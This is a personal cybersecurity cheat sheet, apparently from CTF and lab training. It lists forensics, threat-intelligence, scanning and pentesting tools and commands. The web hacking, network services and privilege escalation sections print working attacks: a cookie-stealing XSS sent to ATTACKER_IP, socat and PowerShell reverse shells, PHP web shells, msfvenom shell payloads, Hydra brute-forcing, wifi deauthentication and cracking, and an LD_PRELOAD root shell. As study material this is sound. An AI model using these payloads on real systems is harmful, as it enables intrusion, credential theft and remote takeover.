# cybersecurity

#### CLI Tools

- Bruteforce

  - [hashcat](https://hashcat.net/hashcat/)
  - [john](https://github.com/openwall/john)
    - ```bash
      cd ~
      git clone https://github.com/openwall/john
      sudo apt install libssl-dev
      cd john/src
      ./configure && make
      echo 'export PATH="PATH:PATH:HOME/john/run"' >> ~/.bashrc
      echo "alias john='~/john/run/john'" >> ~/.bashrc
      source ~/.bashrc
      ```
    - [ssh2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)
    - ``unshadow passwd.txt shadow.txt > to-crack.txt ``
      ``john --wordlist=rockyou.txt to-crack.txt``
  - [hydra](https://github.com/vanhauser-thc/thc-hydra)
    - ``hydra -l username -P wordlist.txt server service``
    - ``hydra -l username -P wordlist.txt service://[MACHINE_IP]:service_port``
    - POST Web Form
      ``sudo hydra `<username>` `<wordlist>` MACHINE_IP http-post-form "`<path>`:<login_credentials>:<invalid_response>"``
    - SSH
      ``hydra -l `<username>` -P `<full path to pass>` MACHINE_IP -t 4 ssh``
- Encryption/Decryption

  - [gpg](https://gnupg.org/) (GNU Privacy Guard)
    - Encrypt: ``gpg --symmetric --cipher-algo CIPHER message.txt``
    - Decrypt: ``gpg --output original_message.txt --decrypt message.gpg``
    - ASCII Armoured Output: ``gpg --armor --symmetric --cipher-algo CIPHER message.txt``
  - [openssl](https://www.openssl.org/)
    - CSR
      ``openssl req -new -nodes -newkey rsa:4096 -keyout key.pem -out cert.csr``
- Python Tools

  * python to exe
    * [PyInstaller](http://www.pyinstaller.org/)
    * [py2exe](https://pypi.python.org/pypi/py2exe/0.9.2.0)
  * [Scapy](https://scapy.net/)
    ``sudo apt install python3-scapy``
  * [keyboard](https://pypi.org/project/keyboard/)
    ``pip3 install keyboard``
  * [hashlib](https://docs.python.org/3/library/hashlib.html)
  * [Paramiko](https://www.paramiko.org/index.html)
    ``pip install paramiko``
- [md5sum](https://en.wikipedia.org/wiki/Md5sum#:~:text=md5sum%20is%20a%20computer%20program,have%20any%20given%20MD5%20hash.)
- [xfreerdp](https://www.freerdp.com/)

  - `sudo apt-get install freerdp2-x11`
  - `xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.31.212 /u:Administrator /p:'TryH4ckM3!'`
- [hexeditor](https://www.kali.org/tools/ncurses-hexedit/)
- [certificate-ripper](https://github.com/Hakky54/certificate-ripper)

#### Online Tools

- [https://nostarch.com/catalog/security](https://nostarch.com/catalog/security)
- [hashes.com](https://hashes.com/en/decrypt/hash)
- [crackstation.net](https://crackstation.net/)
- [cyberchef](https://gchq.github.io/CyberChef/)
- [sms-pdu-to-text](https://www.diafaan.com/sms-tutorials/gsm-modem-tutorial/online-sms-pdu-decoder/)
- [https://www.alpertron.com.ar/JAVAPROG.HTM](https://www.alpertron.com.ar/JAVAPROG.HTM)
- [microcorruption.com](https://microcorruption.com/map)
- [https://base64.guru/](https://base64.guru/)
- [https://www.arin.net/](https://www.arin.net/)
- [IP Info](https://ipinfo.io/)
- [whois lookup](https://www.whois.com/whois/)
- [Expand URL](https://www.expandurl.net/)
- [URL Scan](https://urlscan.io/)
- [Talos Reputation Center](https://talosintelligence.com/reputation_center)
- Track Cyptocurrency Transaction from Wallet Address
  - [https://live.blockcypher.com/](https://live.blockcypher.com/)
  - [https://www.blockchain.com/explorer](https://www.blockchain.com/explorer)
- 

#### CTF Tools

* [ctfnote](https://www.ctfnote.com/)
* [ctf-playbook](https://fareedfauzi.gitbook.io/ctf-playbook/)
* [ctf-docs](https://docs.xanhacks.xyz/)

- Steganography
  - [Zero-Width Space Steganography](https://offdev.net/demos/zwsp-steg-js)
  - [jsteg - JPEG Steganography](https://github.com/lukechampine/jsteg)
  - [Steganography PNG](https://pedrooaugusto.github.io/steganography-png/)
  - steghide
  - zsteg
  - binwalk
  - exiftool
- [cyberchef](https://gchq.github.io/CyberChef/)
- 

#### Binary Exploitation

* Payloads
  * `python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x69\xfe\xca\x00" + b"\x69\x15\x00\x00")' | nc ip port`
* Resources
  * [Liveoverflow](https://youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&feature=shared)
  * [Cryptocat](https://youtube.com/playlist?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&feature=shared)
  * [crackmes](https://crackmes.one/)
* Tools
  * [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)
  * [hopper](https://www.hopperapp.com/)
  * [ida](https://hex-rays.com/ida-free/)
  * [radare2](https://rada.re/n/)
  * [ghidra](https://ghidra-sre.org/)
  * `file`
  * `hexdump`
    * `hexdump -C file_name`
  * `strings`
  * `objdump`
    * `objdump -d file_name`
    * `objdump +x file_name`
      * `.text`
      * `.rodata`
  * `strace` (traces sys calls)
  * `ltrace` (traces library functions)
  * [pwntools](https://github.com/Gallopsled/pwntools)
* GDB (GNU Debugger)
  * `gdb executable_file`
  * `disassemble main`
  * `set disassembly-flavor intel`
  * Add breakpoint
    * `break *main`
    * `break *0x0000000000400607`
  * Run the program
    * `run`
    * `run arguments`
  * Run until the next breakpoint
    `continue`
  * `info registers`
  * `set $register_name=value`
  * Step instruction `si`
  * Next instruction `ni`
  * List of info subcommands `i`
  * `help`
* radare2
  * `radare2 executable_file`
  * Analyze all  `aaa`
  * Stick to the main function `s sym.main`
  * Print the disassembly `pdf`
  * Add breakpoint `db address` (`db 0x00400649`)
  * Reopen in debugger mode (with args) `ood arg1`
  * Continue execution `dc`
  * Show registers `dr`
  * Set register value `dr register_name=address`
  * Enter visual mode `vv`
  * Code flow graph `VV`
  * Press `p` to display the addresses
  * Press `q` two times to exit the view
  * `afvn` for any type of argument or variable
  * Rename a variable `afvn new_name old_name`
  * `V!` to swtich to a fancier mode
  * In any visual mode, press `:` to type commands
* 

#### Defensive Security

* [https://www.abuseipdb.com/](https://www.abuseipdb.com/)
* Network
  * [tcpdump](https://www.tcpdump.org/)
  * [wireshark](https://www.wireshark.org/)
  * [snort](https://www.snort.org/)
    * [snorpy](http://snorpy.cyb3rs3c.net/)
  * [zeek](https://zeek.org/)
  * [network-miner](https://www.netresec.com/?page=NetworkMiner)
  * [brim](https://www.brimdata.io/)
* [Pyramid of Pain
  ](https://www.attackiq.com/glossary/pyramid-of-pain/)Demonstrates that some indicators of a compromise are more troubling to adversaries than others.
  * TTP
  * Tools
  * Network Artifacts
  * Host Artifacts
  * Domain Names
  * IP Address
  * Hash Values
* Models
  * [Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
  * [Unified Kill Chain](https://www.unifiedkillchain.com/)
  * [The Diamond Model of Intrusion Analysis](https://cyware.com/security-guides/cyber-threat-intelligence/what-is-the-diamond-model-of-intrusion-analysis-5f02)
* Blogs
  * [https://thedfirreport.com/](https://thedfirreport.com/)
  * [https://www.trellix.com/en-us/about/newsroom/stories/research.html](https://www.trellix.com/en-us/about/newsroom/stories/research.html)
* Hash Lookups
  * [virustotal](https://www.virustotal.com/gui/home/upload)
  * [metadefender-opswat](https://metadefender.opswat.com/)
* [Fast Flux
  ](https://en.wikipedia.org/wiki/Fast_flux)Compromised hosts acting as proxies. Attacker has control over DNS server. IP address for the same domain keep changing (using IP addressses of the compromised hosts).
* Malware Sandboxes
  * [app.any.run](https://app.any.run/)
  * [hybrid-analysis.com](https://www.hybrid-analysis.com/)
  * [joesecurity.org](https://www.joesecurity.org/)
* [Punnycode
  ](https://en.wikipedia.org/wiki/Punycode)
* Log Analysis
  * Log Configurations
    * Security
    * Operational
    * Legal
    * Debug
  * Logging Principles
    * Collection
    * Format
    * Archiving and Accessibility
    * Monitoring and Alerting
    * Security
    * Continuous Change
  * Logging Challenges
    * Data Volume and Noise
    * System Performance and Collection
    * Process and Archive
    * Security
    * Analysis
    * Misc
  * Types of Logs
    * Application Logs
    * Audit Logs
    * Security Logs
    * Server Logs
    * System Logs
    * Network Logs
    * Database Logs
    * Web Server Logs
  * Common Log File Locations
    * Web Servers
      * Nginx
        * Access Logs: `/var/log/nginx/access.log`
        * Error Logs: `/var/log/nginx/error.log`
      * Apache
        * Access Logs: `/var/log/apache2/access.log`
        * Error Logs: `/var/log/apache2/error.log`
    * Databases
      * MySQL
        * Error Logs: `/var/log/mysql/error.log`
      * PostgreSQL
        * Error and Activitiy Logs: `/var/log/postgresql/postgresql-{version}-main.log`
    * Web Applications
      * PHP
        * Error Logs: `/var/log/php/error.log`
    * Operating Systems
      * Linux
        * General System Logs: `/var/log/syslog`
        * Authentication Logs: `/var/log/auth.log`
    * Firewalls and IDS/IPS
      * iptables:
        * Firewall Logs: `/var/log/iptables.log`
      * Snort:
        * Snort Logs: `/var/log/snort/`
  * Tools
    * [rsyslog](https://www.rsyslog.com/)
    * [logrotate](https://linux.die.net/man/8/logrotate)
    * [splunk](https://www.splunk.com/)
    * [elastic-search](https://www.elastic.co/elastic-stack)
    * [elastic-kibana](https://www.elastic.co/kibana)
    * [elastic-logstash](https://www.elastic.co/logstash)
    * [plaso](https://github.com/log2timeline/plaso)
    * [threatfox](https://threatfox.abuse.ch/)
    * [Sigma](https://github.com/SigmaHQ/sigma)
    * [Yara](https://github.com/VirusTotal/yara)
* DFIR
  * Basics
    * Artifacts
      Pieces of evidence that point to an activity performed on a system
    * Evidence Preservation
      Maintain the integrity of the evidence we are collecting.
    * Chain of Custody
      When the evidence is collected, it must be made sure that it is kept in secure custody.
    * Order of Volatility
      Digital evidence is often volatile.
    * Timeline Creation
      A timeline of events needs to be created for efficient and accurate analysis.
  * Tools
    * [KAPE](https://www.kroll.com/en/insights/publications/cyber/kroll-artifact-parser-extractor-kape)
    * [Autopsy](https://www.autopsy.com/)
    * [Velaciraptor](https://docs.velociraptor.app/)
    * [FTK Imager](https://www.exterro.com/ftk-imager)
  * Incident Response Process
    * Preparation
    * Identification
    * Containment
    * Eradication
    * Recovery
    * Lessons Learned
* Windows Forensics
  * Registry Editor `regedit.exe`
  * Windows Registry
    * Registry Keys
    * Registry Values
    * Registry Hive
      A group of keys, subkeys, and values stored in a single file on the disk.
  * Windows Registry Root Keys
    * `HKEY_CURRENT_USER`
    * `HKEY_USERS`
    * `HKEY_LOCAL_MACHINE`
    * `HKEY_CLASSES_ROOT`
    * `HKEY_CURRENT_CONFIG`
  * Registry Hives Offline
    * `C:\Windows\System32\Config`
      * DEFAULT (mounted on `HKEY_USERS\DEFAULT`)
      * SAM (mounted on `HKEY_LOCAL_MACHINE\SAM`)
      * SECURITY (mounted on `HKEY_LOCAL_MACHINE\Security`)
      * SOFTWARE (mounted on `HKEY_LOCAL_MACHINE\Software`)
      * SYSTEM (mounted on ` HKEY_LOCAL_MACHINE\System`)
    * `C:\Users\<username>\`
      * `NTUSER.DAT` (mounted on `HKEY_CURRENT_USER` when a user logs in)
        Location: `C:\Users\<username>\`
      * `USRCLASS.DAT` (mounted on `HKEY_CURRENT_USER\Software\CLASSES`)
        Location: `C:\Users\<username>\AppData\Local\Microsoft\Windows`
    * Amcache Hive
      Saves information on programs that were recently run on the system.
      Location: `C:\Windows\AppCompat\Programs\Amcache.hve`
  * Registry Transaction
    * Logs Windows often uses transaction logs when writing data to registry hives.
    * Transaction log for each hive is stored as a `registry_hive_name.LOG` file in the same directory as the hive itself.
  * Registry Backups
    Hives are copied to `C:\Windows\System32\Config\RegBack` every 10 days.
  * 
* Linux Forensics
* Email Analysis
  * Internet Message Format (IMF)
  * `Show Original` from more options in gmail.
  * Email Headers
    * `X-Originating-IP`
    * `Reply-To` (or `Return-Path`)
    * `Authentication-Results` (Smtp.mailfrom/header.from)
    * `Content-Type`
    * `Content-Disposition`
    * `Content-Transfer-Encoding`
    * `Content-Id`
    * `X-Attachment-Id`
  * Email Header Analysis
    * [https://toolbox.googleapps.com/apps/messageheader/](https://toolbox.googleapps.com/apps/messageheader/)
    * [https://mailheader.org/](https://mailheader.org/)
    * [https://mha.azurewebsites.net/](https://mha.azurewebsites.net/)
  * [https://www.arin.net/](https://www.arin.net/)
    To which ISP (Internet Service Provider) or webhost the IP address belongs.
  * [IP Info](https://ipinfo.io/)
  * [whois lookup](https://www.whois.com/whois/)
  * Hyperlinks or IP addresses should be "defanged".
    For example, from `http://www.suspiciousdomain.com` to `hxxp[://]www[.]suspiciousdomain[.]com`
    * [Defang URL - Cyberchef](https://gchq.github.io/CyberChef/#recipe=Defang_URL(true,true,true,'Valid%20domains%20and%20full%20URLs'))
    * [Defang IP Address - Cyberchef](https://gchq.github.io/CyberChef/#recipe=Defang_IP_Addresses())
  * [Expand URL](https://www.expandurl.net/)
  * [URL Scan](https://urlscan.io/)
  * [Talos Reputation Center](https://talosintelligence.com/reputation_center)
  * [URL Extractor](https://www.convertcsv.com/url-extractor.htm)
  * Tracking Pixel
    An HTML code snippet which is loaded when a user visits a website or opens an email.
    For example, a small pixel size image getting loaded when the email is opened. Allows the attacker to track the success of the phishing attack.
  * Typosquatting
  * Get hash value of the attachment
  * [VirusTotal](https://www.virustotal.com/gui/home/upload)
  * [PhishTool](https://www.phishtool.com/)
  * Email Security
    * SPF (Sender Policy Framework)
      An SPF record is a DNS TXT record containing a list of the IP addresses that are allowed to send email on behalf of your domain.
      * [SPF Record Lookup](https://mxtoolbox.com/spf.aspx)
    * DKIM (DomainKeys Identified Mail))
      A DKIM record exists in the DNS, but it is a bit more complicated than SPF. DKIM’s advantage is that it can survive forwarding, which makes it superior to SPF and a foundation for securing your email.
    * DMARC
      An open source standard, uses a concept called alignment to tie the result of two other open source standards, SPF & DKIM.
      * [DMARC Record Lookup](https://mxtoolbox.com/dmarc.aspx)
      * [Domain Health Checker](https://dmarcian.com/domain-checker/)
  * [Phishing IR Playbook](https://www.incidentresponse.org/playbooks/phishing)
  * S/MIME (Secure Multipurpose Internet Mail Extensions)
    * Digital Signatures
    * Encryption
* [Timestomping](https://nordvpn.com/cybersecurity/glossary/timestomping/#:~:text=Timestomping%20is%20a%20technique%20used,their%20actions%20or%20impede%20investigations.)
* APT (Advanced Persistent Threat)
* TTP (Tactics, Techniques, and Procedures)
* [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true) (Vulnerability Scanner)
  * `sudo /bin/systemctl start nessusd.service`
  * Visit `https://localhost:8834/`
* [MITRE](https://attack.mitre.org/)
  * [Attack Navigator](https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0008%2FG0008-enterprise-layer.json)
  * [CAR](https://car.mitre.org/) (Cyber Analytics Repository)
  * [Engage](https://engage.mitre.org/)
  * [Defend](https://d3fend.mitre.org/)
  * [Engenuity](https://mitre-engenuity.org/)
* [Yara](https://yara.readthedocs.io/en/stable/writingrules.html)
  * `yara rule.yar file`
  * [awesome-yara](https://github.com/InQuest/awesome-yara)
  * Scanners
    * [Loki](https://github.com/Neo23x0/Loki)
      * Download from [here](https://github.com/Neo23x0/Loki/releases)
    * [Thor Lite](https://www.nextron-systems.com/thor-lite/)
    * [Fenrir](https://github.com/Neo23x0/Fenrir)
    * [Yaya](https://github.com/EFForg/yaya)
  * Generator
    * [yarGen](https://github.com/Neo23x0/yarGen)
  * [Valhala](https://valhalla.nextron-systems.com/)
* [Zero Logon Vulnerability](https://www.secura.com/blog/zero-logon)
* [OpenVAS](https://openvas.org/) (Open Vulnerability Assesment Scanning)
  * `sudo docker run -d -p 443:443 --name openvas mikesplain/openvas`
* [MISP](https://www.misp-project.org/) (Malware Information Sharing Platform)
  * Support
    * IoC Database
    * Automatic Correlation
    * Data Sharing
    * Import & Export Features
    * Event Graph
    * API Support
  * N/A
* [Cyber Threat Intelligence](https://en.wikipedia.org/wiki/Cyber_threat_intelligence) (CTI)
  * Lifecycle
    * Direction
    * Collection
    * Processing
    * Analysis
    * Dissemination
    * Feedback
  * Frameworks
    * MITRE ATT&CK
    * TAXII
    * STIX
    * Cyber Kill Chain
    * The Diamond Model
* [abuse.ch](Abuse.ch) (A community driven threat intelligence on cyber threats)
  * [MalwareBazaar](https://bazaar.abuse.ch/)
  * [Feodo Tracker](https://feodotracker.abuse.ch/)
  * [SSL Blacklist](https://sslbl.abuse.ch/)
  * [URL Haus](https://urlhaus.abuse.ch/)
  * [Threat Fox](https://threatfox.abuse.ch/)
* [Talos Intelligence](https://talosintelligence.com/)
* [OpenCTI](https://filigran.io/solutions/products/opencti-threat-intelligence/)
* Memory Forensics
  * [Volatility](https://github.com/volatilityfoundation/volatility3)
    * `volatility -f Win7-Jigsaw.raw imageinfo`
    * `volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 pslist`
    * `volatility -f Win7-Jigsaw.raw --profile=Win7SP1x64 dlllist -p 3704`
  * 
* 

#### Web Hacking

- [OWASP](https://owasp.org/)
  - [OWASP Top 10](https://owasp.org/www-project-top-ten/)
  - [OWASP Favicon Databse](https://wiki.owasp.org/index.php/OWASP_favicon_database)
- [Postman](https://www.postman.com/)
- [Burp Suite](https://portswigger.net/burp)
  - [FoxyProxy Standard](https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [https://github.com/assetnote/kiterunner](https://github.com/assetnote/kiterunner)
- [https://github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz)
- [https://github.com/owasp-amass/amass](https://github.com/owasp-amass/amass)
- [ffuf](https://github.com/ffuf/ffuf)
- [dirb](https://www.kali.org/tools/dirb/)
- [gobuster](https://www.kali.org/tools/gobuster/)
  - Directory Enumeration
    ``gobuster -u MACHINE_IP -w /snap/seclists/current/Discovery/Web-Content/directory-list-1.0.txt``
  - `+x php,txt,html` will add these extensions to each word while enumerating.
  - `-t 250`
- [nikto](https://www.kali.org/tools/nikto/)
- [nessus](https://www.tenable.com/products/nessus?utm_campaign=gs-{11596512479}-{110256808302}-{537515898656}_00026644_fy23&utm_promoter=tenable-hv-brand-00026644&utm_source=google&utm_term=nessus&utm_medium=cpc&utm_geo=apac&gclid=CjwKCAjw5remBhBiEiwAxL2M94jwwfvyR4FWvmcRZhAz1xxjoaZSZlPskF3mbHCn9c7zI-DdcrOLbBoCn0IQAvD_BwE)
- Inspect Webhook and HTTP Requests
  - [requestbin.com](requestbin.com)
- [Beef](https://beefproject.com/)
- XSS
  - Blind XSS

    - [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)
  - XSS Polyglot
    ``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``
  - Cookie Stealing XSS

    ```
    </textarea><script>fetch('http://ATTACKER_IP:PORT?cookie=' + btoa(document.cookie) );</script>
    ```
  - ```
    <iframe src="javascript:alert(`xss`)"> 
    ```
  - 
- Command Injection
  - [Payload List](https://github.com/payloadbox/command-injection-payload-list)
- SQLi
  - In-Band
  - Blind
    - Authentication Bypass
    - Boolean-based
    - Time-based
  - Out-of-Band
- Subresource Integrity (SRI)
  - Generate Hash: [https://www.srihash.org/](https://www.srihash.org/)
  - ``<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>``
- [bypass-403](https://github.com/iamj0ker/bypass-403)
- Poison Null Byte "*%00"*
  - `http://10.10.91.44/ftp/package.json.bak%2500.md`
  - By placing a NULL character in the string at a certain byte, the string will tell the server to terminate at that point, nulling the rest of the string.
- Broken Access Control
  - Horizontal Privilege Escalation
    User performing an action or access data of another user with the same level of permissions.
  - Vertical Privilege Escalation
    User performing an action or access data of another user with a higher level of permissions.
- Upload Vulnerabilities
  - Overwriting Existing Files
  - Remote Code Execution (RCE)
    - It's worth noting that in a routed application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.
    - Webshells
      - `gobuster dir -u SERVER_URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 250`
      - ```
        <?php echo system($_GET["cmd"]); ?>
        ```
    - Reverse/Bind Shells
      - [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
  - Bypassing Client-Side Filtering
    - Burp Suite
  - Bypassing Server-Side Filtering
    - File Extensions
    - Magic Numbers
      - [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
- `while read line; do echo $line; done < flag.txt`
- `grep . flag.txt` (period for anything)
- 

#### Network Services

* [netcat](https://en.wikipedia.org/wiki/Netcat)

  * ``nc -lvnp port``
* [rlwrap](https://github.com/hanslub42/rlwrap)

  * ``rlwrap nc -lvnp port``
  * ``CTRL + Z``
  * ``stty raw -echo; fg``
* [socat](https://www.kali.org/tools/socat/)

  * [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)
  * Change Terminal Size
    * ``stty -a``
    * ``stty rows number``
    * ``stty cols number``
  * ``socat TCP-L:PORT -``
  * ``socat TCP:TARGET_IP:TARGET_PORT -``
  * Fully Stable Linux TTY Reverse Shell
    * Listener
      ``socat TCP-L:PORT FILE:TTY,raw,echo=0``
    * Activation Command
      ``socat TCP:ATTACKER_IP:ATTACKER_PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane``
  * Reverse Shells
    * Windows
      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:powershell.exe,pipes``
    * Linux
      ``socat TCP:LOCAL_IP:LOCAL_PORT EXEC:"bash -li"``
  * Blind Shells
    * Windows
      ``socat TCP-L:PORT EXEC:powershell.exe,pipes``
    * Linux
      ``socat TCP-L:PORT EXEC:"bash -li"``
  * Encrypted Shells
    Replace `TCP` with `OPENSSL`
    * Generate Certificate
      ``openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt``
      ``cat shell.key shell.crt > shell.pem``
    * Listener
      ``socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -``
    * Activation Command
      ``socat OPENSSL:LOCAL_IP:LOCAL_PORT,verify=0 EXEC:/bin/bash``
  * 
* [nmap](https://nmap.org/)

  * Common
    * ``nmap -A -sC -sV -p- -T4 --min-rate=9326 -vv MACHINE_IP``
    * ``nmap -Pn -sV MACHINE_IP``
    * ``nmap MACHINE_IP -p port1,port2,port3 -script vuln``
  * Options
    * no DNS lookup ``-n``
    * reverse-DNS lookup ``-R``
    * host discovery only (without port-scanning) ``-sn``
    * all ports ``-p-``
    * scan ports 1 to 1023 ``-p1-1023``
    * 100 most common ports ``-F``
    * scan ports in consecutive order ``-r``
    * T0 being the slowest and T5 the fastest ``-T<0-5>``
    * rate <= 50 packets/sec ``--max-rate 50``
    * rate >= 15 packets/sec ``--min-rate 15``
    * at least 100 probes in parallel ``--min-parallelism 100``
    * debugging ``-d``
    * verbose ``-v``
    * explains reasoning ``--reason``
    * fragment IP data ``-f``
    * specify source port ``--source-port PORT_NUM``
    * append random data to reach given length ``--data-length NUM``
    * service/version info ``-sV``
    * os detection ``-O``
    * tracerpite ``--traceroute``
  * ARP Scan ``sudo nmap -PR -sn MACHINE_IP/24``
  * ICMP
    * ICMP Echo Scan ``sudo nmap -PE -sn MACHINE_IP/24``
    * ICMP Timestamp Scan ``sudo nmap -PP -sn MACHINE_IP/24``
    * ICMP Address Mask Scan ``sudo nmap -PM -sn MACHINE_IP/24``
  * TCP
    * TCP SYN Ping Scan ``sudo nmap -PS22,80,443 -sn MACHINE_IP/30``
    * TCP ACK Ping Scan `sudo nmap -PA22,80,443 -sn MACHINE_IP/30`
    * TCP Connect Scan ``nmap -sT 10.10.117.61``
    * TCP Null Scan ``sudo nmap -sN MACHINE_IP``
    * TCP FIN Scan ``sudo nmap -sF MACHINE_IP``
    * TCP Xmas Scan ``sudo nmap -sX MACHINE_IP``
    * TCP Maimon Scan ``sudo nmap -sM MACHINE_IP``
    * Custom TCP Scan ``sudo nmap --scanflags URGACKPSHRSTSYNFIN MACHINE_IP``
  * UDP
    * UDP Ping Scan `sudo nmap -PU53,161,162 -sn MACHINE_IP/30`
  * Spoofed Source IP ``sudo nmap -S SPOOFED_IP MACHINE_IP``
  * Spoofed MAC Address ``--spoof-mac SPOOFED_MAC``
  * Decoy Scan ``nmap -D DECOY_IP,ME MACHINE_IP``
  * Idle (Zombie) Scan ``sudo nmap -sI ZOMBIE_IP MACHINE_IP``
* [enum4linux](https://www.kali.org/tools/enum4linux/)

  * ``enum4linux -a MACHINE_IP``
* [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
* [dsniff](https://www.kali.org/tools/dsniff/)
* Traffic Analysis

  * [wireshark](https://www.wireshark.org/)
  * [tshark](https://www.wireshark.org/docs/man-pages/tshark.html)
  * [NetworkMiner](https://www.netresec.com/?page=NetworkMiner)
  * RSA Netwitness
  * [apackets](https://apackets.com/) (Online)
* MITM

  * [Ettercap](https://www.ettercap-project.org/)
  * [Bettercap](https://www.bettercap.org/)
* Wifi

  * [aircrack-ng](https://www.aircrack-ng.org/)
    * Check for Wifi adapter interface
      ``iwconfig``
    * Run Wifi adapter on `Monitor` mode
      ``sudo airmon-ng start interface_name``
    * Check and kill any interfering process
      ``sudo airmon-ng check kill``
    * Capture traffic from nearby Wifi
      ``sudo airodump-ng interface_name``
    * Capture traffic from target Wifi
      ``sudo airodump-ng --bssid target_bssid -c target_channel --write target_traffic interface_name``
    * Deauthentication attack
      ``sudo aireplay-ng --deauth packet_count -a target_bssid interface_name``
      * In case of similar issue (``wlan0mon is on channel 2, but the AP uses channel 5 ``)
        ``sudo airmon-ng start interface_name target_channel``
    * Cracking the password
      ``sudo aircrack-ng -b target_bssid captured_traffic.cap -w wordlist``
    * Convert to hashcat file (`-j` or `-J`)
      ``sudo aircrack-ng -j output.hccapx -b target_bssid file.cap``
  * [wifite](https://www.kali.org/tools/wifite/)
* [smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/#smtp-user-enum)
* [metasploit](https://www.metasploit.com/)

  * Database
    * ``systemctl start postgresql``
    * ``msfdb init``
    * db_status
    * workspace
    * help
    * db_nmap
    * hosts
    * services
  * SMTP
    * smtp_enum
    * smtp_version
  * MySQL
    * mysql_sql
    * mysql_schemadump
    * mysql_hashdump
  * multi/handler
    * `use multi/handler`
    * `exploit -j`
  * msfvenom
    * `msfvenom -p PAYLOAD OPTIONS`
    * Payload Name
      `OS/arch/payload`
      `linux/x86/shell_reverse_tcp`
    * Windows x64 Reverse Shell in an exe format
      `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=listen-IP LPORT=listen-port`
    * Payloads
      * Staged Payloads (`/`)
        (Better for evading firewalls)
      * Stageless Payloads (`_`)
        (Can be caught using `nc` listener instead of `multi/handler`)
    * `msfvenom --list payloads`
    * `msfvenom --list payloads | grep "some_payload"`
  * portscan
  * SMB
    * smb_enumshares
    * smb_version
    * smb_login
  * enum_shares
  * meterpreter
  * hashdump
  * kiwi
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

  * Windows Powershell Reverse Shell

    ```
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.17.69.74',12345);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
* [impacket](https://github.com/fortra/impacket)
* Web Shells

  * ```php
    <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
    ```
* [Staged vs Stageless Payloads](https://blog.spookysec.net/stage-v-stageless-1/)
* 

#### Priviledge Escalation

* [PEASS-ng](https://github.com/carlospolop/PEASS-ng)
* [GTFOBins](https://gtfobins.github.io/)
* [DirtyCow](https://dirtycow.ninja/)
* Linux
  * Commands
    * ``hostname``
    * ``uname -a``
    * ``/proc/version``
    * ``/etc/issue``
    * ps
      * ``ps``
      * ``ps -A``
      * ``ps axjf``
      * ``ps aux``
    * ``env``
    * ``sudo -l``
    * ``id``
    * ``/etc/passwd``
      * ``cat /etc/passwd | cut -d ":" -f 1``
      * ``cat /etc/passwd | grep home``
    * ``history``
    * ``ifconfig``
    * ``ip route``
    * ``netstat``
      * ``netstat -a``
    * ``find``
      * ``find /home -name flag1.txt``
  * [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
  * [LinEnum](https://github.com/rebootuser/LinEnum)
  * Kernel Exploit
    * [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves)
  * Sudo
    * ``sudo -l``
    * [https://gtfobins.github.io/](https://gtfobins.github.io/)
    * [LD_PRELOAD](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/)
      Generate a shared library which will be loaded and executed before the program is run.
      1. Check for LD_PRELOAD (with the env_keep option)
      2. Write a simple C code compiled as a share object (.so extension) file
         * ``#include <stdio.h> #include <sys/types.h> #include <stdlib.h> void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }``
         * ``gcc -fPIC -shared -o shell.so shell.c -nostartfiles``
